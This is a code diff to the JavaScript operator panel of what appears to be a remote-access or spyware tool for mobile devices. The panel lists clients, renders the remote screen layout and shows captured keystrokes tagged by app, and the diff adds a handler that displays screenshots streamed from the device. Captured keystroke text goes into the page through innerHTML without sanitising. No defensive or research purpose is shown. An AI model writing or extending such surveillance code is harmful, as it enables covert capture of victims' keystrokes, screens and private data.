@@ -199,6 +199,7 @@ function conectar() {
       case 'lista_clientes':   renderClientes(msg.clientes); break;
       case 'sessao_iniciada':  onSessaoIniciada(msg); break;
       case 'arvore_tela':      desenharWireframe(JSON.parse(msg.elementos), msg.pacote); break;
+      case 'screenshot':       mostrarScreenshot(msg.frame); break;
       case 'keylog':           logKey(msg.texto, msg.app || '?'); break;
       case 'campo_texto_focado':
         abrirInputTexto(msg.texto_atual || '');
@@ -407,6 +408,24 @@ function logKey(texto, app) {
   d.innerHTML = `<span class="app">${new Date().toLocaleTimeString('pt-BR')} — ${app}</span>${texto}`;
   el.prepend(d);
   if (abaAtual !== 'key') document.getElementById('key-badge').style.display = 'inline';
+}
+
+function mostrarScreenshot(base64) {
+  const canvas  = document.getElementById('wireframe-canvas');
+  const screen  = document.getElementById('screen');
+  const sw = screen.offsetWidth  || VISOR_W;
+  const sh = screen.offsetHeight || Math.round(VISOR_W * dh / dw);
+  canvas.width  = sw;
+  canvas.height = sh;
+  const ctx = canvas.getContext('2d');
+  const img = new Image();
+  img.onload = () => {
+    ctx.clearRect(0, 0, sw, sh);
+    ctx.drawImage(img, 0, 0, sw, sh);
+  };
+  img.src = 'data:image/jpeg;base64,' + base64;
+  document.getElementById('placeholder').style.display = 'none';
+  log('Screenshot recebido', 'ev');
 }
 
 function setStatus(online) {
